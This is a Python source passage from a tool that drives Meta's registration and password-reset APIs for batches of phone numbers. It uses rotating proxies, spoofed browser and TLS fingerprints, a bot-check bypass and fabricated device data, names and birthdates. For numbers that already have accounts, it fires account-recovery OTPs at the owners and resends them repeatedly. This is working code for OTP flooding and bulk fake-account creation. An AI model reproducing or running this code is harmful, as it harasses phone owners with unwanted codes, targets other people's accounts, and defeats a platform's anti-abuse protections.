        all_cps = fp_json.get('payload', {}).get('initiate_view_data', {}).get('all_cps', [])
        encrypted_cp = None
        clean_target = str(number).lstrip('+')
        for cp in all_cps:
            if cp.get('is_user_entered_cp'):
                encrypted_cp = cp.get('encrypted_cp')
                break
        if not encrypted_cp:
            for cp in all_cps:
                d_cp = str(cp.get('display_cp', '')).replace('*', '').replace(' ', '').replace('-', '')
                if d_cp and clean_target[-6:].endswith(d_cp[-2:]):
                    encrypted_cp = cp.get('encrypted_cp')
                    break
        if not encrypted_cp:
            for cp in all_cps:
                if cp.get('cp_type') == 'PHONE_NUMBER':
                    encrypted_cp = cp.get('encrypted_cp')
                    break

        if encrypted_cp:
            s_val_recovery = generate_s_val()
            sn_data = {
                'contact_point': encrypted_cp,
                'is_contact_point_encrypted': 'true',
                'qpl_join_id': generate_qpl_join_id(),
                'source_app_id': '1522763855472543',
                'caa_event_flow': 'account_recovery',
                'csi': csi,
                'event_client_time': f'{time.time():.3f}',
                'waterfall_id': waterfall_id,
                **build_common_params(
                    auth_hs, auth_rev, s_val_recovery, auth_hsi, auth_dyn, auth_csr,
                    auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t,
                    auth_ccg, auth_hsdp, auth_hblp, auth_sjsp
                ),
                '__req': '4b'
            }
            sn_resp = session.post('https://auth.meta.com/api/reset-password/send-nonce/', headers=fp_headers, data=sn_data, timeout=30)
            sn_text = strip_json_prefix(sn_resp.text)
            sn_json = json.loads(sn_text)
            if not sn_json.get('error'):
                update_counter(
                    'success', number,
                    f'OTP Sent to Existing Account! (Recovery Flow) [UA: {ua_display}] [Country: {country_code}] [Proxy: {actual_proxy_country}]',
                    GREEN
                )
                save_success_number(number)
                save_registered_number(number)
                if resend_count > 0:
                    for r_idx in range(1, resend_count + 1):
                        time.sleep(round(random.uniform(2.5, 4.0), 2))
                        try:
                            s_val_resend2 = generate_s_val()
                            resend_sn_data = {
                                'contact_point': encrypted_cp,
                                'is_contact_point_encrypted': 'true',
                                'qpl_join_id': generate_qpl_join_id(),
                                'source_app_id': '1522763855472543',
                                'caa_event_flow': 'account_recovery',
                                'csi': csi,
                                'event_client_time': f'{time.time():.3f}',
                                'waterfall_id': waterfall_id,
                                **build_common_params(
                                    auth_hs, auth_rev, s_val_resend2, auth_hsi, auth_dyn, auth_csr,
                                    auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t,
                                    auth_ccg, auth_hsdp, auth_hblp, auth_sjsp
                                ),
                                '__req': to_base36(60 + r_idx)
                            }
                            r_sn_resp = session.post('https://auth.meta.com/api/reset-password/send-nonce/', headers=fp_headers, data=resend_sn_data, timeout=30)
                            r_sn_json = json.loads(strip_json_prefix(r_sn_resp.text))
                            if not r_sn_json.get('error'):
                                safe_print(f'{GREEN} {number} OTP Resend {r_idx}/{resend_count} Successful! (Recovery) [{actual_proxy_country}] [UA: {ua_display}]{RESET}')
                            else:
                                safe_print(f'{YELLOW} {number} OTP Resend {r_idx}/{resend_count} Failed (Recovery) [{actual_proxy_country}] [UA: {ua_display}]{RESET}')
                        except Exception as e_resend:
                            safe_print(f'{YELLOW} {number} Resend OTP {r_idx} Error (Recovery): {e_resend} [{actual_proxy_country}]{RESET}')
                return True
            err_msg = sn_json.get('errorDescription') or str(sn_json.get('error', 'Unknown send-nonce error'))
            update_counter('failed', number, f'Recovery Send-Nonce Failed: {err_msg}', RED)
            save_failed_number(number)
            return False
        else:
            update_counter('failed', number, 'Account Recovery: No matching contact point found', RED)
            save_failed_number(number)
            return False
    except Exception as e_fp:
        update_counter('error', number, f'Account Recovery Error: {str(e_fp)[:50]}', RED)
        save_failed_number(number)
        return False


def process_number(number, user_agent_data, proxy=None, resend_count=1):
    if isinstance(user_agent_data, tuple):
        user_agent, ua_name = user_agent_data
        ua_display = format_ua_label(user_agent_data) if not ua_name or ua_name == 'Unknown UA' else ua_name
    else:
        user_agent = user_agent_data
        ua_display = format_ua_label(user_agent)

    number = number.strip()
    raw_number = number.lstrip('+')
    if not number.startswith('+'):
        number = '+' + number

    time.sleep(random.uniform(1.0, 5.0))
    impersonate_target = get_impersonate_target(user_agent)
    session = requests.Session(impersonate=impersonate_target)
    session.verify = False

    lang_header, country_code, _ = get_locale_for_proxy(proxy, number)
    actual_proxy_country = 'Unknown'
    if proxy:
        if isinstance(proxy, dict):
            if 'country' in proxy and proxy['country'] != 'Unknown':
                actual_proxy_country = proxy['country']
            elif 'original' in proxy:
                match = re.search(r'[-_](?:region|country|zone)[-_]([a-zA-Z]{2})(?=[-_:]|$)', proxy['original'], re.IGNORECASE)
                if match:
                    actual_proxy_country = match.group(1).upper()
            if 'original' in proxy:
                proxy_dict = parse_proxy(proxy['original'])
            elif 'proxy' in proxy:
                proxy_dict = proxy['proxy']
            else:
                proxy_dict = proxy
        else:
            proxy_dict = parse_proxy(str(proxy))
        if proxy_dict:
            session.proxies.update(proxy_dict)
        safe_print(f'{GREEN} 🌐 PROXY [{actual_proxy_country}] [{number}] | UA: {ua_display} | TLS: {impersonate_target}{RESET}')
    else:
        safe_print(f'{CYAN} 🏠 REAL IP (Direct Connection) [{number}] | UA: {ua_display} | TLS: {impersonate_target}{RESET}')

    req_first_name = generate_random_first_name()
    req_last_name = generate_random_last_name()
    req_display_name = f'{req_first_name} {req_last_name}'
    req_device_id = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=24))
    fb_boot_id = str(uuid.uuid4())
    fb_session_id = str(uuid.uuid4())
    fb_advertising_id = str(uuid.uuid4())
    fb_hwid = str(uuid.uuid4())
    fb_battery = random.randint(20, 98)
    fb_uptime = random.randint(10000, 300000)
    fb_foreground_time = random.randint(5000, 120000)
    fb_bandwidth = random.randint(20000000, 150000000)
    fb_locale = auto_fb_locale(country_code)
    fb_carrier = auto_carrier(country_code)
    device_specs = [
        {'model': 'iPhone15,2', 'ram': '6', 'density': '3.0'},
        {'model': 'iPhone16,1', 'ram': '8', 'density': '3.0'},
        {'model': 'iPhone14,5', 'ram': '6', 'density': '3.0'},
        {'model': 'iPhone13,2', 'ram': '4', 'density': '3.0'}
    ]
    dev = random.choice(device_specs)
    fb_tz_offset = auto_tz_offset(country_code)

    is_safari = ('iPhone' in user_agent or 'iPad' in user_agent) or ('Mac OS X' in user_agent and 'Safari' in user_agent and 'Chrome' not in user_agent)
    is_firefox = 'Firefox' in user_agent or 'KAIOS' in user_agent
    is_mobile = any(k in user_agent for k in ('iPhone', 'iPad', 'Android', 'Mobile', 'KAIOS', 'Windows Phone', 'BlackBerry', 'BB10'))

    base_headers = {
        'accept-language': lang_header,
        'user-agent': user_agent,
        'accept-encoding': 'gzip, deflate, br, zstd'
    }
    ch_headers = get_browser_ch_headers(user_agent, is_mobile=is_mobile)
    if ch_headers:
        base_headers.update(ch_headers)
        if 'Android' in user_agent:
            match = re.search(r'Android (\d+)', user_agent)
            base_headers['sec-ch-ua-platform-version'] = f'"{match.group(1)}"' if match else '"14"'
        elif 'Windows' in user_agent:
            base_headers['sec-ch-ua-platform-version'] = '"10.0.0"'
        base_headers['sec-ch-prefers-color-scheme'] = 'dark'

    api_headers = {
        **base_headers,
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://auth.meta.com',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'x-asbd-id': '359341',
        'sec-ch-ua-model': '""'
    }
    entry_nonce = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    api_headers['x-fb-entry-nonce'] = entry_nonce
    if not is_safari and not is_firefox:
        api_headers['priority'] = 'u=1, i'

    page_accept = (
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        if (is_safari or is_firefox)
        else 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
    )
    page_headers = {
        **base_headers,
        'accept': page_accept,
        'referer': 'https://www.google.com/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
    }
    if not is_safari and not is_firefox:
        page_headers['priority'] = 'u=0, i'

    try:
        waterfall_id = str(uuid.uuid4())
        s_val = generate_s_val()
        qpl_id = generate_qpl_join_id()
        dyn = META_DEFAULT_DYN
        csr = META_DEFAULT_CSR
        oidc_url = f'https://www.meta.ai/api/oidc/start?waterfall_id={waterfall_id}&entry_point=login_home'
        oidc_uri = None
        try:
            r_meta = session.get('https://www.meta.ai/', headers=page_headers, allow_redirects=True, timeout=15)
            if r_meta.status_code == 403 or "fetch('/__rd_verify_" in r_meta.text:
                challenge_match = re.search(r"fetch\('(/__rd_verify_[^']+)'\s*,", r_meta.text)
                if challenge_match:
                    challenge_url = 'https://www.meta.ai' + challenge_match.group(1)
                    challenge_headers = {
                        **base_headers,
                        'accept': '*/*',
                        'origin': 'https://www.meta.ai',
                        'referer': 'https://www.meta.ai/',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin'
                    }
                    if not is_safari and not is_firefox:
                        challenge_headers['priority'] = 'u=1, i'
                    session.post(challenge_url, headers=challenge_headers, timeout=15)
        except requests.exceptions.RequestException as req_err:
            err_str = str(req_err).lower()
            if 'socks5 authentication failed' in err_str or 'socks5 auth' in err_str:
                update_counter('error', number, 'SOCKS5 Auth Failed!', RED)
                save_failed_number(number)
                return 'RETRY'

        oidc_headers = {
            **base_headers,
            'accept': page_accept,
            'referer': 'https://www.meta.ai/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin'
        }
        oidc_resp = session.get(oidc_url, headers=oidc_headers, allow_redirects=False, timeout=15)
        oidc_uri = oidc_resp.headers.get('Location') or oidc_resp.headers.get('location')
        if not oidc_uri:
            update_counter('error', number, 'oidc_uri not found!', RED)
            save_failed_number(number)
            return 'RETRY'

        safe_print(f'{GREEN} ⚡ META AI CONNECTED [{number}]{RESET}')
        step3_headers = {
            **base_headers,
            'accept': page_accept,
            'accept-language': lang_header,
            'referer': 'https://www.meta.ai/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1'
        }
        if not is_safari and not is_firefox:
            step3_headers['priority'] = 'u=0, i'

        response = session.get(oidc_uri, headers=step3_headers, allow_redirects=True, timeout=30)
        if response.status_code != 200:
            update_counter('error', number, 'auth redirect failed!', RED)
            save_failed_number(number)
            return False

        auth_referer = response.url
        parsed_auth_url = urlparse(auth_referer)
        auth_params = parse_qs(parsed_auth_url.query)
        csi = auth_params.get('csi', [''.join(random.choices(string.ascii_letters + string.digits + '_-', k=24))])[0]
        auth_redirect_uri = auth_params.get('redirect_uri', ['https://www.meta.ai/oidc/'])[0]

        auth_tokens = extract_tokens(response.text, session_cookies=session.cookies, default_comet_req='33')
        auth_lsd = auth_tokens['lsd']
        auth_rev = auth_tokens['rev']
        auth_hsi = auth_tokens['hsi']
        auth_spin_b = auth_tokens['spin_b']
        auth_spin_t = auth_tokens['spin_t']
        auth_hs = auth_tokens['hs']
        auth_comet_req = auth_tokens['comet_req']
        auth_jazoest = calc_jazoest(auth_lsd) if auth_lsd else auth_tokens['jazoest']
        auth_dyn = auth_tokens.get('dyn') or META_DEFAULT_DYN
        auth_csr = auth_tokens.get('csr') or META_DEFAULT_CSR
        auth_hsdp = auth_tokens.get('hsdp') or META_DEFAULT_HSDP
        auth_hblp = auth_tokens.get('hblp') or META_DEFAULT_HBLP
        auth_sjsp = auth_tokens.get('sjsp') or META_DEFAULT_SJSP
        auth_tos_cms_id = auth_tokens.get('tos_cms_id') or META_DEFAULT_TOS_CMS_ID
        auth_ccg = extract_ccg(response)
        if auth_ccg == 'GOOD':
            auth_ccg = 'EXCELLENT'

        current_year = time.localtime().tm_year
        dob_year = random.randint(current_year - 35, current_year - 18)
        dob_month = random.randint(1, 12)
        dob_day = random.randint(1, 28)
        dob = f'{dob_year}-{dob_month:02d}-{dob_day:02d}'

        s_val = generate_s_val()
        step4_headers = {
            **api_headers,
            'accept-language': lang_header,
            'origin': 'https://auth.meta.com',
            'referer': auth_referer,
            'x-fb-lsd': auth_lsd
        }
        contact_point_e164 = number.strip() if number.strip().startswith('+') else '+' + number.strip()
        contact_point_raw = number.strip().lstrip('+')
        contact_point = contact_point_e164

        step4_data = {
            'account_reg_info[birthday]': time.strftime('%Y-%m-%d'),
            'account_reg_info[device_id]': '',
            'account_reg_info[first_name]': '',
            'account_reg_info[has_youth_consent]': 'false',
            'account_reg_info[is_bootstrap_flow]': 'false',
            'account_reg_info[last_name]': '',
            'account_reg_info[pc_rendering_data]': '',
            'account_reg_info[phone_number]': contact_point_raw,
            'account_reg_info[registration_flow_id]': '',
            'allow_unconfirmed_email': 'false',
            'check_for_pre_registration_restrictions': 'true',
            'check_mma_account': 'true',
            'contact_point': contact_point_e164,
            'contact_point_type': 'PHONE_NUMBER',
            'reg_integrity': '',
            'check_ntm_qe': 'true',
            'check_passwordless': 'true',
            'skip_xapp_checks': 'false',
            'caa_event_flow': '',
            'csi': csi,
            'event_client_time': f'{time.time():.3f}',
            'waterfall_id': waterfall_id,
            'source_app_id': '1522763855472543',
            'qpl_join_id': generate_qpl_join_id(),
            **build_common_params(
                auth_hs, auth_rev, s_val, auth_hsi, auth_dyn, auth_csr,
                auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t,
                auth_ccg, auth_hsdp, auth_hblp, auth_sjsp
            ),
            '__req': '1h'
        }
        response = session.post('https://auth.meta.com/api/check-contact-point-availability/', headers=step4_headers, data=step4_data, timeout=30)
        auth_ccg = extract_ccg(response)
        step4_text = strip_json_prefix(response.text)
        reg_integrity = ''
        try:
            step4_json = json.loads(step4_text)
            if step4_json.get('error'):
                step4_err = (
                    step4_json.get('errorDescription') or
                    (step4_json['error'].get('message', 'Unknown Step 4 Error') if isinstance(step4_json.get('error'), dict) else str(step4_json.get('error')))
                )
                error_code = step4_json['error'].get('code', 0) if isinstance(step4_json.get('error'), dict) else (step4_json.get('error') if isinstance(step4_json.get('error'), int) else 0)
                safe_print(f'{YELLOW} {number} Step 4 Error (Code: {error_code}): {step4_err} [{actual_proxy_country}]{RESET}')
                err_lower = str(step4_err).lower()
                existing_keywords = [
                    'exist', 'already', 'যুক্ত', 'আগে থেকেই', 'קיים', 'موجود', 'уже', 'существует',
                    'ya está', 'já está', 'déjà', 'bereits', 'già', 'zaten', '사용', 'すでに',
                    'tồn tại', 'ada', 'sudah', 'mewujud', 'esistente', 'registered', 'associated'
                ]
                is_existing = any(kw in err_lower for kw in existing_keywords) or error_code in (3301, 1357004, 3116, 1357001, 3571123, 3571239, 3571188, 3571178, 3571189)
                if is_existing:
                    return send_otp_for_existing_account(
                        session, number, contact_point, auth_referer, auth_lsd, auth_hs, auth_rev,
                        auth_hsi, auth_dyn, auth_csr, auth_comet_req, auth_jazoest, auth_spin_b,
                        auth_spin_t, auth_ccg, auth_hsdp, auth_hblp, auth_sjsp, api_headers,
                        lang_header, csi, waterfall_id, resend_count, ua_display, country_code,
                        actual_proxy_country, error_code=error_code
                    )
                update_counter('failed', number, f'Step 4 Error: {step4_err}', RED)
                save_failed_number(number)
                return False
            step4_payload_main = step4_json.get('payload')
            if isinstance(step4_payload_main, dict):
                reg_integrity = step4_payload_main.get('regIntegrity', '')
        except json.JSONDecodeError:
            pass

        if not reg_integrity:
            ri_match = re.search(r'"regIntegrity"\s*:\s*"([^"]+)"', response.text)
            if ri_match:
                reg_integrity = ri_match.group(1)

        try:
            step4_payload = step4_json.get('payload', {})
            if isinstance(step4_payload, dict) and step4_payload.get('contactPoint', ''):
                contact_point = step4_payload['contactPoint'].lstrip('+')
            else:
                cp_match = re.search(r'"contactPoint"\s*:\s*"([^"]+)"', response.text)
                if cp_match:
                    contact_point = cp_match.group(1).lstrip('+')
                else:
                    contact_point = contact_point.lstrip('+')
        except Exception:
            contact_point = contact_point.lstrip('+')

        s_val = generate_s_val()
        qpl_join_id = generate_qpl_join_id()
        step5_headers = {
            **api_headers,
            'origin': 'https://auth.meta.com',
            'referer': auth_referer,
            'x-fb-lsd': auth_lsd
        }
        step5_data = {
            'caa_event_flow': 'ntm',
            'date_of_birth': dob,
            'has_youth_consent': 'false',
            'isf': 'false',
            'phone_number': contact_point,
            'qpl_join_id': qpl_join_id,
            'reg_integrity': reg_integrity,
            'source_app_id': '1522763855472543',
            **build_common_params(
                auth_hs, auth_rev, s_val, auth_hsi, auth_dyn, auth_csr,
                auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t,
                auth_ccg, auth_hsdp, auth_hblp, auth_sjsp
            ),
            '__req': '1s'
        }
        response = session.post('https://auth.meta.com/api/check-date-of-birth/', headers=step5_headers, data=step5_data, timeout=30)
        auth_ccg = extract_ccg(response)
        step5_text = strip_json_prefix(response.text)
        try:
            step5_json = json.loads(step5_text)
            if step5_json.get('error'):
                error_obj = step5_json.get('error')
                error_msg = step5_json.get('errorDescription') or (error_obj.get('message') or error_obj.get('summary') if isinstance(error_obj, dict) else str(error_obj))
                error_msg_str = str(error_msg).lower()
                existing_keywords = [
                    'exist', 'already', 'যুক্ত', 'আগে থেকেই', 'קיים', 'موجود', 'уже', 'существует',
                    'ya está', 'já está', 'déjà', 'bereits', 'già', 'zaten', '사용', 'すでに',
                    'tồn tại', 'ada', 'sudah', 'mewujud', 'esistente', 'registered', 'associated'
                ]
                if any(kw in error_msg_str for kw in existing_keywords):
                    safe_print(f'{CYAN} {number} Existing Account Detected at DOB! Switching to OTP recovery... [{ua_display}]{RESET}')
                    return send_otp_for_existing_account(
                        session, number, contact_point, auth_referer, auth_lsd, auth_hs, auth_rev,
                        auth_hsi, auth_dyn, auth_csr, auth_comet_req, auth_jazoest, auth_spin_b,
                        auth_spin_t, auth_ccg, auth_hsdp, auth_hblp, auth_sjsp, api_headers,
                        lang_header, csi, waterfall_id, resend_count, ua_display, country_code,
                        actual_proxy_country
                    )
                status_text = f'Failed at DOB: {error_msg}'
                update_counter('failed', number, status_text, YELLOW)
                save_failed_number(number)
                return False
            payload = step5_json.get('payload')
            if isinstance(payload, dict):
                new_ri = payload.get('regIntegrity', '')
                if new_ri:
                    reg_integrity = new_ri
        except json.JSONDecodeError:
            pass

        password = generate_password()
        formatted_password = f'#PWD_BROWSER:0:{int(time.time())}:{password}'
        s_val = generate_s_val()
        qpl_join_id = generate_qpl_join_id()
        step6_headers = {
            **api_headers,
            'origin': 'https://auth.meta.com',
            'referer': auth_referer,
            'x-fb-lsd': auth_lsd
        }
        step6_data = {
            'contact_point': contact_point,
            'date_of_birth': dob,
            'password': formatted_password,
            'contact_pointless_account': 'false',
            'qpl_join_id': qpl_join_id,
            **build_common_params(
                auth_hs, auth_rev, s_val, auth_hsi, auth_dyn, auth_csr,
                auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t,
                auth_ccg, auth_hsdp, auth_hblp, auth_sjsp
            ),
            '__req': '1u'
        }
        response = session.post('https://auth.meta.com/api/check-password/', headers=step6_headers, data=step6_data, timeout=30)
        auth_ccg = extract_ccg(response)
        step6_text = strip_json_prefix(response.text)
        try:
            step6_json = json.loads(step6_text)
            if step6_json.get('error'):
                error_msg = step6_json.get('errorDescription', 'Unknown error')
                update_counter('failed', number, f'Password step failed! {error_msg}', RED)
                save_failed_number(number)
                return False
            payload = step6_json.get('payload')
            if isinstance(payload, dict):
                new_ri = payload.get('regIntegrity', '')
                if new_ri:
                    reg_integrity = new_ri
        except json.JSONDecodeError:
            pass

        s_val_username = generate_s_val()
        suggest_data = {
            'linked_account_display_name': '',
            'linked_account_type': '',
            'linked_account_username': '',
            **build_common_params(
                auth_hs, auth_rev, s_val_username, auth_hsi, auth_dyn, auth_csr,
                auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t,
                auth_ccg, auth_hsdp, auth_hblp, auth_sjsp
            ),
            '__req': '1y'
        }
        username = generate_random_username()
        try:
            suggest_resp = session.post('https://auth.meta.com/api/kadabra/suggest_username/', headers=step6_headers, data=suggest_data, timeout=30)
            suggest_json = json.loads(strip_json_prefix(suggest_resp.text))
            suggested_user = suggest_json.get('payload', {}).get('username')
            if suggested_user:
                username = suggested_user
        except Exception:
            pass

        s_val_marketing = generate_s_val()
        marketing_data = {
            'date_of_birth': dob,
            **build_common_params(
                auth_hs, auth_rev, s_val_marketing, auth_hsi, auth_dyn, auth_csr,
                auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t,
                auth_ccg, auth_hsdp, auth_hblp, auth_sjsp
            ),
            '__req': '1z'
        }
        try:
            session.post('https://auth.meta.com/api/eligible-for-default-marketing-opt-in/', headers=step6_headers, data=marketing_data, timeout=30)
        except Exception:
            pass

        s_val_check_profile = generate_s_val()
        check_profile_data = {
            'client_consent_timestamp': str(int(time.time())),
            'display_name': '',
            'foa_import_source_name': '',
            'foa_import_source_obid': '',
            'nta_disclosures_summary_cms_id': '',
            'picture_source': '',
            'tos_cms_id': auth_tos_cms_id,
            'username': username,
            'caa_event_flow': 'ntm',
            'csi': csi,
            'source_app_id': '1522763855472543',
            'waterfall_id': waterfall_id,
            'is_submit': 'true',
            **build_common_params(
                auth_hs, auth_rev, s_val_check_profile, auth_hsi, auth_dyn, auth_csr,
                auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t,
                auth_ccg, auth_hsdp, auth_hblp, auth_sjsp
            ),
            '__req': '25'
        }
        try:
            profile_resp = session.post('https://auth.meta.com/api/kadabra/check_profile/', headers=step6_headers, data=check_profile_data, timeout=30)
            auth_ccg = extract_ccg(profile_resp)
        except Exception:
            pass

        s_val = generate_s_val()
        qpl_join_id = generate_qpl_join_id()
        step7_headers = {
            **api_headers,
            'origin': 'https://auth.meta.com',
            'referer': auth_referer,
            'x-fb-lsd': auth_lsd
        }
        _jurisdiction = actual_proxy_country if actual_proxy_country != 'Unknown' else country_code
        step7_data = {
            'client_consent_timestamp': str(int(time.time())),
            'tos_cms_id': auth_tos_cms_id,
            'username': username,
            'contact_point': contact_point,
            'contact_point_type': 'PHONE_NUMBER',
            'csi': csi,
            'date_of_birth': dob,
            'has_youth_consent': 'false',
            'is_kadabra_zero': 'false',
            'opt_into_marketing': 'false',
            'password': formatted_password,
            'passwordless_registration': 'false',
            'redirect_uri': auth_redirect_uri,
            'reg_integrity': reg_integrity,
            'reg_navigation_flow_name': 'new_to_family_c50_r1',
            'regulation_jurisdiction': f'["{_jurisdiction}"]',
            'should_save_credentials': 'true',
            'source_app_id': '1522763855472543',
            'waterfall_id': waterfall_id,
            'caa_event_flow': 'ntm',
            'entry_point': 'login_home',
            'event_client_time': f'{time.time():.3f}',
            'qpl_join_id': qpl_join_id,
            **build_common_params(
                auth_hs, auth_rev, s_val, auth_hsi, auth_dyn, auth_csr,
                auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t,
                auth_ccg, auth_hsdp, auth_hblp, auth_sjsp
            ),
            '__req': '26'
        }
        response = session.post('https://auth.meta.com/login/device-based/kadabra-register-save-credentials/', headers=step7_headers, data=step7_data, timeout=30)
        auth_ccg = extract_ccg(response)
        step7_text = strip_json_prefix(response.text)
        try:
            step7_json = json.loads(step7_text)
            if step7_json.get('error'):
                error_msg = step7_json.get('errorDescription', 'Unknown error')
                error_msg_str = str(error_msg).lower()
                existing_keywords = [
                    'exist', 'already', 'যুক্ত', 'আগে থেকেই', 'קיים', 'موجود', 'уже', 'существует',
                    'ya está', 'já está', 'déjà', 'bereits', 'già', 'zaten', '사용', 'すでに',
                    'tồn tại', 'ada', 'sudah', 'mewujud', 'esistente', 'registered', 'associated'
                ]
                if any(kw in error_msg_str for kw in existing_keywords):
                    safe_print(f'{CYAN} {number} Existing Account Detected at Registration! Switching to OTP recovery... [{ua_display}]{RESET}')
                    return send_otp_for_existing_account(
                        session, number, contact_point, auth_referer, auth_lsd, auth_hs, auth_rev,
                        auth_hsi, auth_dyn, auth_csr, auth_comet_req, auth_jazoest, auth_spin_b,
                        auth_spin_t, auth_ccg, auth_hsdp, auth_hblp, auth_sjsp, api_headers,
                        lang_header, csi, waterfall_id, resend_count, ua_display, country_code,
                        actual_proxy_country
                    )
                update_counter('failed', number, f'Registration failed! {error_msg}', RED)
                save_failed_number(number)
                return False

            payload = step7_json.get('payload')
            if payload and isinstance(payload, dict):
                if 'account_id' in payload:
                    account_id = payload.get('account_id', '')
                    primary_lang = lang_header.split(',')[0]
                    update_counter(
                        'success', number,
                        f'Registration Successful! OTP Sent! ID:{account_id} [UA: {ua_display}] [Country: {country_code}] [Lang: {primary_lang}] [Proxy: {actual_proxy_country}]',
                        GREEN
                    )
                    save_registered_number(number)
                    save_success_number(number)
                    fb_dtsg = payload.get('dtsgToken') or auth_tokens.get('fb_dtsg') or ''
                    resend_jazoest = calc_jazoest(fb_dtsg) if fb_dtsg else auth_jazoest
                    if resend_count > 0:
                        for r_idx in range(1, resend_count + 1):
                            time.sleep(round(random.uniform(2.5, 4.0), 2))
                            try:
                                s_val_new = generate_s_val()
                                resend_headers = {
                                    **api_headers,
                                    'origin': 'https://auth.meta.com',
                                    'referer': auth_referer,
                                    'x-fb-lsd': auth_lsd,
                                    'x-fb-friendly-name': 'FRLResendOTPMutation'
                                }
                                resend_variables = {
                                    'input': {
                                        'contact_point': {'sensitive_string_value': contact_point},
                                        'contact_point_type': 'PHONE_NUMBER',
                                        'event_flow': 'ntm',
                                        'rl_client_session_id': csi,
                                        'source_app_id': 1522763855472543,
                                        'waterfall_id': waterfall_id,
                                        'actor_id': '0',
                                        'client_mutation_id': str(r_idx)
                                    }
                                }
                                resend_data = {
                                    'av': '0',
                                    'fb_dtsg': fb_dtsg,
                                    'fb_api_caller_class': 'RelayModern',
                                    'fb_api_req_friendly_name': 'FRLResendOTPMutation',
                                    'server_timestamps': 'true',
                                    'variables': json.dumps(resend_variables, separators=(',', ':')),
                                    'doc_id': '25885129117818218',
                                    **build_common_params(
                                        auth_hs, auth_rev, s_val_new, auth_hsi, auth_dyn, auth_csr,
                                        auth_comet_req, auth_lsd, resend_jazoest, auth_spin_b, auth_spin_t,
                                        auth_ccg, auth_hsdp, auth_hblp, auth_sjsp
                                    ),
                                    '__req': to_base36(89 + r_idx)
                                }
                                response = session.post('https://auth.meta.com/api/graphql/', headers=resend_headers, data=resend_data, timeout=30)
                                resend_text = strip_json_prefix(response.text)
                                resend_json = json.loads(resend_text)
                                resend_success = False
                                data_obj = resend_json.get('data')
                                if isinstance(data_obj, dict):
                                    otp_obj = data_obj.get('resend_otp')
                                    if isinstance(otp_obj, dict) and otp_obj.get('success', False):
                                        resend_success = True
                                if resend_success:
                                    safe_print(f'{GREEN} {number} OTP Resend {r_idx}/{resend_count} Successful! [{actual_proxy_country}] [UA: {ua_display}]{RESET}')
                                else:
                                    error_desc = 'Failed'
                                    if 'errors' in resend_json and isinstance(resend_json['errors'], list) and len(resend_json['errors']) > 0:
                                        err_first = resend_json['errors'][0]
                                        if isinstance(err_first, dict):
                                            error_desc = err_first.get('message', 'Failed')
                                    safe_print(f'{YELLOW} {number} OTP Resend {r_idx}/{resend_count} Failed: {error_desc} [{actual_proxy_country}] [UA: {ua_display}]{RESET}')
                            except Exception as e:
                                safe_print(f'{YELLOW} {number} Resend OTP {r_idx} Error: {e} [{actual_proxy_country}]{RESET}')
                    return True
                elif 'validation_errors' in payload:
                    errors = payload['validation_errors']
                    update_counter('failed', number, f'Registration failed! {errors}', RED)
                    save_failed_number(number)
                    return False
            update_counter('failed', number, 'Registration failed! (payload null)', RED)
            save_failed_number(number)
            return False
        except json.JSONDecodeError:
            update_counter('error', number, 'Response parse failed!', RED)
            save_failed_number(number)
            return False
    except requests.exceptions.ConnectionError as e:
        update_counter('error', number, f'Network error: {str(e)[:30]}...', RED)
        save_failed_number(number)
        delay = 2
        time.sleep(delay)
        return 'RETRY'
    except requests.exceptions.Timeout:
        update_counter('error', number, 'Request timeout!', RED)
        save_failed_number(number)
        time.sleep(2)
        return 'RETRY'
    except requests.exceptions.RequestException as e:
        update_counter('error', number, f'Request error: {str(e)[:30]}...', RED)
        save_failed_number(number)
        time.sleep(2)
        return 'RETRY'
    except Exception as e:
        update_counter('error', number, f'Unexpected error: {str(e)[:30]}...', RED)
        save_failed_number(number)
        return False


import hashlib
import json as jsond
import subprocess

try:
    import httpx
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'httpx[http2]'])
    import httpx


def process_muse_number(number, user_agent_data, proxy_data=None, resend_count=1):
    from curl_cffi import requests as cffi_requests
    import uuid
    import re
    import time
    import random

    if isinstance(user_agent_data, tuple):
        user_agent, ua_display = user_agent_data[0], user_agent_data[1] or format_ua_label(user_agent_data[0])
    else:
        user_agent = user_agent_data
        ua_display = format_ua_label(user_agent)

    clean_num = re.sub(r'[^0-9]', '', str(number))
    if not str(number).startswith('+'):
        number = '+' + clean_num
    else:
        number = '+' + clean_num

    time.sleep(random.uniform(2.0, 8.0))
    lang_header, country_code, browser_lang = get_locale_for_proxy(proxy_data, clean_num.lstrip('+'))
    region = country_code or 'US'
    waterfall_id = str(uuid.uuid4())
    proxy_dict = None
    actual_proxy_country = 'Direct'
    if proxy_data:
        if isinstance(proxy_data, dict):
            p_dict = proxy_data.get('proxy')
            actual_proxy_country = proxy_data.get('country', 'Proxy')
            if isinstance(p_dict, dict):
                proxy_dict = p_dict
        elif isinstance(proxy_data, str):
            proxy_dict = {'http': proxy_data, 'https': proxy_data}
            actual_proxy_country = 'Proxy'

